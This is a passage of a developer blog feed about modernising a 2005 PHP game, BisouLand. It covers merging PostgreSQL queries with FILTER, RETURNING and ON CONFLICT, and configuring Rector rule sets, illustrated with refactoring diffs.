$retour = $pdo-&gt;query("SELECT COUNT(*) AS nb FROM membres WHERE confirmation=TRUE AND lastconnect &gt;= CURRENT_TIMESTAMP - INTERVAL '30 days'");
$connectMois = $retour-&gt;fetchColumn();
$retour = $pdo-&gt;query("SELECT COUNT(*) AS nb FROM membres WHERE confirmation=TRUE AND lastconnect &gt;= CURRENT_TIMESTAMP - INTERVAL '1 year'");
$connectAn = $retour-&gt;fetchColumn();
</code></pre>

<p>We see 9 separate queries. Turns out PostgreSQL can merge them into a single query,
with <code>FILTER</code>:</p>

<pre><code class="php">$stmt = $pdo-&gt;query(&lt;&lt;&lt;'SQL'
    SELECT
        SUM(amour) AS total_love_points,
        COUNT(*) FILTER (WHERE lastconnect &gt;= CURRENT_TIMESTAMP - INTERVAL '5 minutes') AS last_5_min,
        COUNT(*) FILTER (WHERE lastconnect &gt;= CURRENT_TIMESTAMP - INTERVAL '1 hour') AS last_hour,
        COUNT(*) FILTER (WHERE lastconnect &gt;= CURRENT_TIMESTAMP - INTERVAL '12 hours') AS last_12h,
        COUNT(*) FILTER (WHERE lastconnect &gt;= CURRENT_TIMESTAMP - INTERVAL '24 hours') AS last_24h,
        COUNT(*) FILTER (WHERE lastconnect &gt;= CURRENT_TIMESTAMP - INTERVAL '48 hours') AS last_48h,
        COUNT(*) FILTER (WHERE lastconnect &gt;= CURRENT_TIMESTAMP - INTERVAL '7 days') AS last_week,
        COUNT(*) FILTER (WHERE lastconnect &gt;= CURRENT_TIMESTAMP - INTERVAL '30 days') AS last_month,
        COUNT(*) FILTER (WHERE lastconnect &gt;= CURRENT_TIMESTAMP - INTERVAL '1 year') AS last_year
    FROM membres
    WHERE confirmation = TRUE
SQL);
/**
 * @var array{
 *     total_love_points: int|null,
 *     last_5_min: int,
 *     last_hour: int,
 *     last_12h: int,
 *     last_24h: int,
 *     last_48h: int,
 *     last_week: int,
 *     last_month: int,
 *     last_year: int,
 * } $result
 */
$result = $stmt-&gt;fetch();
</code></pre>

<h3 id="returning%3A-one-query%2C-a-select-and-an-update">RETURNING: One query, a select and an update</h3>

<p>In the following code snippet, we:</p>

<ol>
<li>select an Upgradable Item level (e.g. the Heart level), store it in a variable</li>
<li>increment the variable</li>
<li>update in the database the Upgradable Item level</li>
</ol>

<pre><code class="php">    // On effectue la tache dans la table membre.
    $stmt2 = $pdo-&gt;prepare('SELECT '.$Obj[$classe][$type].', amour FROM membres WHERE id = :id');
    $stmt2-&gt;execute(['id' =&gt; $id2]);
    $donnees_info = $stmt2-&gt;fetch();
    $amourConstructeur = $donnees_info['amour'];
    // On r√©cup√®re l'ancienne valeur.
    $nbObjEvol = $donnees_info[$Obj[$classe][$type]];
    // On augmente d'un.
    ++$nbObjEvol;
    // On met a jour la table.
    $stmt2 = $pdo-&gt;prepare('UPDATE membres SET '.$Obj[$classe][$type].' = :nb WHERE id = :id');
    $stmt2-&gt;execute(['nb' =&gt; $nbObjEvol, 'id' =&gt; $id2]);
</code></pre>

<p>With <code>RETURNING</code> it's possible to directly increment the value in the database and return it:</p>

<pre><code class="php">    // On effectue la tache dans la table membre.
    $stmt2 = $pdo-&gt;prepare(&lt;&lt;&lt;SQL
        UPDATE membres
        SET {$upgradableItem} = {$upgradableItem} + 1
        WHERE id = :account_id
        RETURNING amour, {$upgradableItem}
    SQL);
    $stmt2-&gt;execute([
        'account_id' =&gt; $upgrade['account_id'],
    ]);
    /** @var array&lt;string, int&gt;|false $player */
    $player = $stmt2-&gt;fetch();
    $amourConstructeur = $player['amour'];
    // On r√©cup√®re l'ancienne valeur.
    $nbObjEvol = $player[$upgradableItem];
</code></pre>

<h3 id="on-conflict%3A-one-query%2C-insert-or-update">ON CONFLICT: One query, insert or update</h3>

<p>Sometimes we want to either create a new resource, or modify it,
which means an extra query to check the existence:</p>

<pre><code class="php">    $stmt = $pdo-&gt;prepare('SELECT COUNT(*) AS nbre_entrees FROM connectbisous WHERE ip = :ip');
    $stmt-&gt;execute(['ip' =&gt; $_SERVER['REMOTE_ADDR']]);
    $donnees = $stmt-&gt;fetch();
    if (0 == $donnees['nbre_entrees']) { // L'ip ne se trouve pas dans la table, on va l'ajouter
        $stmt = $pdo-&gt;prepare('INSERT INTO connectbisous VALUES(:ip, :timestamp, 2)');
        $stmt-&gt;execute(['ip' =&gt; $_SERVER['REMOTE_ADDR'], 'timestamp' =&gt; time()]);
    } else { // L'ip se trouve d√©j√† dans la table, on met juste √† jour le timestamp
        $stmt = $pdo-&gt;prepare('UPDATE connectbisous SET timestamp = :timestamp WHERE ip = :ip');
        $stmt-&gt;execute(['timestamp' =&gt; time(), 'ip' =&gt; $_SERVER['REMOTE_ADDR']]);
    }
</code></pre>

<p>With "UPSERT" (UPdate + inSERT, also possible with MySQL, but different syntax),
it's possible to do all this in one single query:</p>

<pre><code class="php">    $stmt = $pdo-&gt;prepare(&lt;&lt;&lt;'SQL'
        INSERT INTO connectbisous (ip, timestamp, type)
        VALUES (:ip, CURRENT_TIMESTAMP, 2)
        ON CONFLICT (ip) DO UPDATE
        SET timestamp = CURRENT_TIMESTAMP
    SQL);
    $stmt-&gt;execute([
        'ip' =&gt; $_SERVER['REMOTE_ADDR'],
    ]);
</code></pre>
]]></content>
        </entry>
            <entry>
            <title type="html"><![CDATA[eXtreme Legacy 7: Rector]]></title>
            <link href="/2025/11/26/xl-7-rector.html"/>
            <updated>2025-11-26T00:00:00+00:00</updated>
            <id>/2025/11/26/xl-7-rector.html</id>
            <content type="html"><![CDATA[<blockquote>
  <p>ü§ò Behold Rector, the Metamorphosis Overlord,
  wielding the dark grimoire of AST manipulation to transmute ancient incantations of PHP 5.6
  into the blazing runes of PHP 8.x through unholy automated rituals! üî•</p>
</blockquote>

<p>In this series, we're dealing with BisouLand, an eXtreme Legacy application
(2005 LAMP spaghetti code base). So far, we have:</p>

<ol>
<li><a href="/2025/09/10/xl-1-dockerizing-2005-lamp-app.html">üêã got it to run in a local container</a></li>
<li><a href="/2025/09/17/xl-2-smoke-tests.html">üí® written Smoke Tests</a></li>
<li><a href="/2025/09/24/xl-3-end-to-end-tests.html">üéØ written End to End Tests</a></li>
<li><a href="/2025/10/01/xl-4-coding-standards.html">üßπ created and applied Coding Standards</a></li>
<li><a href="/2025/10/22/xl-5-pdo.html">‚õÉ migrated to PDO</a></li>
<li><a href="/2025/11/19/xl-6-php-8.html">üêò upgraded PHP 5 to PHP 8</a></li>
</ol>

<p>This means we can run it locally (http://localhost:43000/),
and have some level of automated tests.</p>

<p>But even with a modern PHP version,
we still have an eXtreme Legacy spaghetti code...</p>

<p>So let's use Rector to apply some automated refactorings</p>

<ul>
<li><a href="#what-is-the-difference-with-php-cs-fixer">What is the difference with PHP CS Fixer</a></li>
<li><a href="#what-is-rector">What is Rector</a></li>
<li><a href="#early-return">Early Return</a></li>
<li><a href="#code-quality">Code Quality</a></li>
<li><a href="#type-declaration">Type Declaration</a></li>
<li><a href="#dead-code">Dead Code</a></li>
<li><a href="#cherry-pick-your-rules">Cherry Pick your rules</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ul>

<h2 id="what-is-the-difference-with-php-cs-fixer">What is the difference with PHP CS Fixer</h2>

<p>A question I often get asked is: what's the difference between rector and PHP CS Fixer?</p>

<p>PHP CS Fixer was initially created to automatically fix coding style issues,
such as "indentation: 4 spaces vs 1 tab",
or "opening curly brace: one the same line vs on a new line", etc.</p>

<p>With time it grew to do more than just fixing coding style issues,
like replacing deprecated function calls to their modern counterparts.</p>

<p>But it is a token-based parsing tool (using PHP's <code>token_get_all()</code>),
meaning it looks at the code as a series of keywords (<code>class</code>), whitespaces (<code></code>),
identifiers (<code>MyClass</code>), punctuations (<code>{</code>), etc,
it's very much a flat array.</p>

<p>This means that there's a limit to how much it can know and understand about the code,
and therefore how (and when) to modify it.</p>

<p>For all intent and purposes we should treat PHP CS Fixer as a Coding Style enforcer,
even if it can do more than that.</p>

<h2 id="what-is-rector">What is Rector</h2>

<p>Rector was created to automatically refactor code,
such as adding type declarations, simplifying complex control flow,
or removing dead code.</p>

<p>With time it grew to do more than just refactoring code,
like fixing coding style.</p>

<p>So there is some overlap with PHP CS Fixer,
but Rector is an Abstract Syntax Tree (AST) tool (using <a href="https://github.com/nikic/PHP-Parser">PHP Parser</a>),
meaning it holds an structured model of the code (<code>Class</code> object,
with <code>identifier</code> attribute set to <code>MyClass</code>,
collection of <code>Property</code> objects each having a <code>visibility</code>, <code>type</code> and <code>identifier</code> attributes, etc).</p>

<p>This means it can have a deep understanding of the code and therefore how
to modify it in a way that is safe (for example it won't add a <code>string</code> typehint
to a function argument if somewhere in the code a <code>bool</code> is passed to it
or if it's used as an integer inside the function).</p>

<p>Some people know it as the "one off automatic upgrade tool", because it can:</p>

<ul>
<li>upgrade your PHP app to newer versions (as we did in the previous article)</li>
<li>upgrade your PHPUnit testsuite to newer versions (e.g. replace PHPdoc <code>@test</code> annotation with <code>#[Test]</code> attributes)</li>
<li>upgrade your Symfony app to newer version</li>
</ul>

<p>But is is more useful as a "linting" tool that is run on every change made (for example in the CI):
once all the deprecated function calls have been replaced with their modern counterparts,
you don't want someone reintroducing a deprecated function call by accident.</p>

<p>But coding style and upgrades are secondary features of Rector,
its main one is to allow you to define Code Quality rules that are going to be automatically
enforced as part of your CI workflow.</p>

<p>Out of the box, rector provides you with Rules as well as rule Sets,
let's have a look at what they can do for us.</p>

<h2 id="early-return">Early Return</h2>

<p>The <a href="https://getrector.com/find-rule?rectorSet=core-early-return&amp;activeRectorSetGroup=core">Early Return</a>
set is a collection of rules that will check if your code can be simplified with earlier return:</p>

<ul>
<li><a href="https://getrector.com/rule-detail/prepared-value-to-early-return-rector">PreparedValueToEarlyReturnRector</a></li>
<li><a href="https://getrector.com/rule-detail/return-binary-or-to-early-return-rector">ReturnBinaryOrToEarlyReturnRector</a></li>
<li><a href="https://getrector.com/rule-detail/return-early-if-variable-rector">ReturnEarlyIfVariableRector</a></li>
<li><a href="https://getrector.com/rule-detail/change-nested-ifs-to-early-return-rector">ChangeNestedIfsToEarlyReturnRector</a></li>
<li><a href="https://getrector.com/rule-detail/remove-always-else-rector">RemoveAlwaysElseRector</a></li>
<li><a href="https://getrector.com/rule-detail/change-if-else-value-assign-to-early-return-rector">ChangeIfElseValueAssignToEarlyReturnRector</a></li>
<li><a href="https://getrector.com/rule-detail/change-or-if-continue-to-multi-continue-rector">ChangeOrIfContinueToMultiContinueRector</a></li>
<li><a href="https://getrector.com/rule-detail/change-nested-foreach-ifs-to-early-continue-rector">ChangeNestedForeachIfsToEarlyContinueRector</a></li>
</ul>

<p>Let's enable it in the <code>rector.php</code> config file:</p>

<pre><code class="php">&lt;?php

declare(strict_types=1);

use Rector\Caching\ValueObject\Storage\FileCacheStorage;
use Rector\Config\RectorConfig;
use Rector\Set\ValueObject\SetList;

return RectorConfig::configure()
    -&gt;withCache(
        cacheDirectory: '/tmp/rector',
        cacheClass: FileCacheStorage::class,
    )
    -&gt;withPaths([
        __DIR__,
        __DIR__.'/../monolith',
    ])
    -&gt;withSkip([
        // ‚Äî‚Äî Excluded paths ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
        // [qa]
        __DIR__.'/vendor',
        // [monolith]
        __DIR__.'/../monolith/vendor',
    ])
    -&gt;withSets([
        // ‚Äî‚Äî PHP ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
        SetList::PHP_84,

        // ‚Äî‚Äî Core ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
        SetList::EARLY_RETURN,
    ])
    -&gt;withRules([
    ]);
</code></pre>

<p>Now let's run it using:</p>

<pre><code class="console">make rector # ./vendor/bin/rector process
</code></pre>

<p>In the BisouLand codebase, this applies the <code>ReturnEarlyIfVariableRector</code> rule:</p>

<pre><code class="diff">  function calculterAmour($CalAmour, $timeDiff, $LvlCoeur, $nb1, $nb2, $nb3)
  {
      $CalAmour = calculerGenAmour($CalAmour, $timeDiff, $LvlCoeur, $nb1, $nb2, $nb3);
      // Cette fonction ajoute un frein sur le minima.
      if ($CalAmour &lt; 0) {
-         $CalAmour = 0;
+         return 0;
      }

      return $CalAmour;
  }
</code></pre>

<p>As well as the <code>RemoveAlwaysElseRector</code> rule:</p>

<pre><code class="diff">  // Permet de convertir un timestamp en chaine sous la forme heure:minutes:secondes.
  function strTemps($s): string
  {
      $m = 0;
      $h = 0;
      if ($s &lt; 0) {
          return '0:00:00';
-     } else {
-       if ($s &gt; 59) {
-           $m = floor($s / 60);
-           $s = $s - $m * 60;
-       }
-       if ($m &gt; 59) {
-           $h = floor($m / 60);
-           $m = $m - $h * 60;
-       }
-       $ts = $s;
-       $tm = $m;
-       if ($s &lt; 10) {
-           $ts = '0'.$s;
-       }
-       if ($m &lt; 10) {
-           $tm = '0'.$m;
-       }
-       if ($h &gt; 24) {
-           $d = floor($h / 24);
-           $h = $h - $d * 24;
-           $h = $d.' jours '.$h;
-       }
- 
-       return $h.' h '.$tm.' min '.$ts.' sec';
+     }
+ 
+     if ($s &gt; 59) {
+         $m = floor($s / 60);
+         $s = $s - $m * 60;
+     }
+ 
+     if ($m &gt; 59) {
+         $h = floor($m / 60);
+         $m = $m - $h * 60;
+     }
+ 
+     $ts = $s;
+     $tm = $m;
+     if ($s &lt; 10) {
+         $ts = '0'.$s;
+     }
+ 
+     if ($m &lt; 10) {
+         $tm = '0'.$m;
+     }
+ 
+     if ($h &gt; 24) {
+         $d = floor($h / 24);
+         $h = $h - $d * 24;
+         $h = $d.' jours '.$h;
+     }
+ 
+     return $h.' h '.$tm.' min '.$ts.' sec';
  }
</code></pre>

<h2 id="code-quality">Code Quality</h2>

<p>The <a href="https://getrector.com/find-rule?rectorSet=core-code-quality&amp;activeRectorSetGroup=core">Code Quality</a>
rule set includes a whopping 78 rules. I've enabled it as follow:</p>

<pre><code class="php">// Extract from file: rector.php
// [...]

        // ‚Äî‚Äî Core ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
        SetList::CODE_QUALITY,
        SetList::EARLY_RETURN,
</code></pre>

<p>And after running it on the BisouLand codebase,
out of the 78 the following 8 have been applied:</p>

<ul>
<li><a href="https://getrector.com/rule-detail/use-identical-over-equal-with-same-type-rector">UseIdenticalOverEqualWithSameTypeRector</a></li>
<li><a href="https://getrector.com/rule-detail/simplify-bool-identical-true-rector">SimplifyBoolIdenticalTrueRector</a></li>
<li><a href="https://getrector.com/rule-detail/combine-if-rector">CombineIfRector</a></li>
<li><a href="https://getrector.com/rule-detail/shorten-else-if-rector">ShortenElseIfRector</a></li>
<li><a href="https://getrector.com/rule-detail/simplify-if-else-to-ternary-rector">SimplifyIfElseToTernaryRector</a></li>
<li><a href="https://getrector.com/rule-detail/absolutize-require-and-include-path-rector">AbsolutizeRequireAndIncludePathRector</a></li>
<li><a href="https://getrector.com/rule-detail/switch-negated-ternary-rector">SwitchNegatedTernaryRector</a></li>
<li><a href="https://getrector.com/rule-detail/combine-if-rector">CombineIfRector</a></li>
</ul>

<p>Now let's focus on <strong>UseIdenticalOverEqualWithSameTypeRector</strong>,
"Use <code>===</code> / <code>!==</code> over <code>==</code> / <code>!=</code>, if values have the same type".</p>

<p>There is similar rule in PHP CS Fixer,
<a href="https://cs.symfony.com/doc/rules/strict/strict_comparison.html">strict_comparison</a>,
but if we configure that it'll change <strong>ALL</strong> comparisons in the codebase to strict,
whether it's safe to do so or not.</p>

<p>Rector is able to detect the type of variables, so it'll only apply it if it's safe to do so,
for example in <code>nuage.php</code>:</p>

<pre><code class="diff">              $sautPossible = 0;
              // Au moins saut niveau 1.
              if ($nbE[2][3] &gt; 0) {
                  $distance = abs(16 * ($nuageL - $nuageSource) + $i - $positionSource);
                  // On prend en compte les jambes, et le niveau de saut.
                  $distMax2 = distanceMax($nbE[0][4], $nbE[2][3]);
                  if ($distance &lt;= $distMax2) {
                      $sautPossible = 1;
                  }
              }
-             if (1 == $sautPossible) {
+             if (1 === $sautPossible) {
</code></pre>

<p><code>$sautPossible</code> was defined with an integer (should really be a boolean, but whatever),
is potentially (in a if) set to another integer value, so it's safe to strictly
compare it to an integer.</p>

<h2 id="type-declaration">Type Declaration</h2>

<p>In addition to value assignments (<code>$sautPossible = 0</code>), Rector can know the type
of a variable from the Type Hints of functions they are passed in or that return them.</p>

<p>In eXtreme Legacy applications like BisouLand, we do not have such type Hints,
but Rector can add them for us (again only if it knows it's safe to do so),
thanks to the 63 rules in the set
<a href="https://getrector.com/find-rule?rectorSet=core-type-declaration&amp;activeRectorSetGroup=core">Type Declaration</a>.</p>

<p>For example <a href="https://getrector.com/rule-detail/numeric-return-type-from-strict-scalar-returns-rector">NumericReturnTypeFromStrictScalarReturnsRector</a>:</p>

<pre><code class="diff">  // Fonction qui retourne 0 si joueurAutre est meme niveau, 1 s'il est intouchable parce que trop faible, 2 s'il est intouchable parce que trop fort.
- function voirNiveau($scoreJoueur, $scoreAutre)
+ function voirNiveau($scoreJoueur, $scoreAutre): int
  {
      if ($scoreJoueur &lt; 50) {
          return 2;
      }
      if ($scoreAutre &lt; 50) {
          return 1;
      }
      if ($scoreJoueur &gt; 2000 &amp;&amp; $scoreAutre &gt; 2000) {
          return 0;
      }
      if (abs($scoreAutre - $scoreJoueur) &lt;= 200) {
          return 0;
      }
      if ($scoreJoueur - $scoreAutre &gt; 200) {
          return 1;
      }

      return 2;
  }
</code></pre>

<p>The advantage of keeping Rector as part of your CI means that as you improve the codebase,
some previous rules will be able to be automatically applied again, such as <strong>UseIdenticalOverEqualWithSameTypeRector</strong>!</p>

<p>Previously in <code>nuage.php</code>, <code>$Niveau</code>'s type was considered as <code>mixed</code>, but thanks to the return type hint
Rector now knows it's an integer, and so that it's safe to use strict type comparison:</p>

<pre><code class="diff">                  $Niveau = voirNiveau($scoreSource, $score);
-                 if (1 == $Niveau) {
+                 if (1 === $Niveau) {
                      if ($score &gt;= 50) {
                          echo '&lt;a class="bulle" style="cursor: default;color:blue;" onclick="return false;" href=""&gt;&lt;strong&gt;',$donnees_info['pseudo'],'&lt;/strong&gt;&lt;span style="color:blue;"&gt;Joueur trop faible&lt;/span&gt;';
                      } else {
                          echo '&lt;a class="bulle" style="cursor: default;color:teal;" onclick="return false;" href=""&gt;&lt;strong&gt;',$donnees_info['pseudo'],'&lt;/strong&gt;&lt;span style="color:teal;"&gt;Joueur ayant moins de 50 points&lt;/span&gt;';
                      }
-                 } elseif (0 == $Niveau) {
+                 } elseif (0 === $Niveau) {
                      echo '&lt;a class="bulle" style="cursor: default;color:red;" onclick="return false;" href=""&gt;&lt;strong&gt;',$donnees_info['pseudo'],'&lt;/strong&gt;&lt;span style="color:red;"&gt;Ce joueur a ton niveau&lt;/span&gt;';
</code></pre>

<h2 id="dead-code">Dead Code</h2>

<p>Another powerful rule set is <a href="https://getrector.com/find-rule?activeRectorSetGroup=core&amp;rectorSet=core-dead-code">Dead Code</a>
and its 55 rules.</p>

<p>For example in <a href="https://getrector.com/rule-detail/remove-always-true-if-condition-rector">RemoveAlwaysTrueIfConditionRector</a>,
Rector is able to detect conditions that would always evaluate to <code>true</code>,
and therefore remove the condition check altogether.</p>

<p>In the following snippet, Rector detects that <code>$resultat</code> is always set
because every single code path assigns it a value,
making the <code>isset($resultat)</code> check redundant:</p>

<pre><code class="diff">      if (isset($_GET['Dnuage'], $_GET['Dpos']) &amp;&amp; !empty($_GET['Dnuage']) &amp;&amp; !empty($_GET['Dpos'])) {
          $Dnuage = htmlentities((string) $_GET['Dnuage']);
          $Dpos = htmlentities((string) $_GET['Dpos']);
          if ($nbE[0][5] &gt; 0) {
              $stmt = $pdo-&gt;prepare('SELECT id, oeil, score, pseudo FROM membres WHERE nuage = :nuage AND position = :position');
              $stmt-&gt;execute(['nuage' =&gt; $Dnuage, 'position' =&gt; $Dpos]);
              if ($donnees = $stmt-&gt;fetch()) {
                  // [...]
                  if (0 == $Niveau) {
                      if ($amour &gt;= $cout) {
                          $resultat = "Tu as d√©visag√© {$pseudoCible}";
                          // [...]
                      } else {
                          $resultat = "Tu n'as pas assez de Points d'Amour";
                      }
                  } else {
                      $resultat = "Tu n'as pas le m√™me niveau que ce joueur";
                  }
              } else {
                  $resultat = "Il n'y a plus de joueur a cette position";
              }
          } else {
              $resultat = 'Il te faut des yeux niveau 1 pour d√©visager un joueur';
          }
          ?&gt;
  &lt;h1&gt;D√©visager&lt;/h1&gt;
  &lt;br /&gt;
  &lt;a href="&lt;?php echo $Dnuage; ?&gt;.nuage.html"&gt;Retourner sur le nuage en cours&lt;/a&gt;&lt;br /&gt;
  &lt;br /&gt;
  &lt;?php
-             if (isset($resultat)) {
-                 echo '&lt;span class="info"&gt;[ '.$resultat.' ]&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;';
-             }
+             echo '&lt;span class="info"&gt;[ '.$resultat.' ]&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;';
</code></pre>

<h2 id="cherry-pick-your-rules">Cherry Pick your rules</h2>

<p>There are more rule sets, here are the ones that have been configured for BisouLand:</p>

<pre><code class="php">&lt;?php

declare(strict_types=1);

use Rector\Caching\ValueObject\Storage\FileCacheStorage;
use Rector\CodingStyle\Rector\Closure\StaticClosureRector;
use Rector\CodingStyle\Rector\FuncCall\ArraySpreadInsteadOfArrayMergeRector;
use Rector\Config\RectorConfig;
use Rector\PHPUnit\Set\PHPUnitSetList;
use Rector\Set\ValueObject\SetList;
use Rector\TypeDeclarationDocblocks\Rector\Class_\AddReturnDocblockDataProviderRector;
use Rector\TypeDeclarationDocblocks\Rector\Class_\ClassMethodArrayDocblockParamFromLocalCallsRector;
use Rector\TypeDeclarationDocblocks\Rector\Class_\DocblockVarArrayFromGetterReturnRector;
use Rector\TypeDeclarationDocblocks\Rector\Class_\DocblockVarArrayFromPropertyDefaultsRector;
use Rector\TypeDeclarationDocblocks\Rector\Class_\DocblockVarFromParamDocblockInConstructorRector;
use Rector\TypeDeclarationDocblocks\Rector\ClassMethod\AddParamArrayDocblockBasedOnArrayMapRector;
use Rector\TypeDeclarationDocblocks\Rector\ClassMethod\AddParamArrayDocblockFromAssignsParamToParamReferenceRector;
use Rector\TypeDeclarationDocblocks\Rector\ClassMethod\AddParamArrayDocblockFromDataProviderRector;
use Rector\TypeDeclarationDocblocks\Rector\ClassMethod\AddParamArrayDocblockFromDimFetchAccessRector;
use Rector\TypeDeclarationDocblocks\Rector\ClassMethod\AddReturnDocblockForArrayDimAssignedObjectRector;
use Rector\TypeDeclarationDocblocks\Rector\ClassMethod\AddReturnDocblockForCommonObjectDenominatorRector;
use Rector\TypeDeclarationDocblocks\Rector\ClassMethod\AddReturnDocblockForJsonArrayRector;
use Rector\TypeDeclarationDocblocks\Rector\ClassMethod\DocblockGetterReturnArrayFromPropertyDocblockVarRector;
use Rector\TypeDeclarationDocblocks\Rector\ClassMethod\DocblockReturnArrayFromDirectArrayInstanceRector;
use Rector\Visibility\Rector\ClassConst\ChangeConstantVisibilityRector;
use Rector\Visibility\Rector\ClassMethod\ChangeMethodVisibilityRector;

return RectorConfig::configure()
    -&gt;withCache(
        cacheDirectory: '/tmp/rector',
        cacheClass: FileCacheStorage::class,
    )
    -&gt;withPaths([
        __DIR__,
        __DIR__.'/../monolith',
    ])
    -&gt;withSkip([
        // ‚Äî‚Äî Excluded paths ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
        // Excluded folders
        // [qa]
        __DIR__.'/vendor',
        // [monolith]
        __DIR__.'/../monolith/vendor',

        // ‚Äî‚Äî Excluded rules ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
        // [CODE_QUALITY]
        Rector\CodeQuality\Rector\Assign\CombinedAssignRector::class,
        // [CODING_STYLE]
        Rector\CodingStyle\Rector\Encapsed\EncapsedStringsToSprintfRector::class,
    ])
    -&gt;withSets([
        // ‚Äî‚Äî PHP ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
        SetList::PHP_84,

        // ‚Äî‚Äî Core ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
        SetList::CODE_QUALITY,
        SetList::CODING_STYLE,
        SetList::DEAD_CODE,
        SetList::EARLY_RETURN,
        SetList::INSTANCEOF,
        SetList::NAMING,
        SetList::PRIVATIZATION,
        SetList::STRICT_BOOLEANS,
        SetList::TYPE_DECLARATION,

        // ‚Äî‚Äî PHPUnit ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
        PHPUnitSetList::PHPUNIT_CODE_QUALITY,
        PHPUnitSetList::PHPUNIT_120,
    ])
    -&gt;withRules([
        // ‚Äî‚Äî Core ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
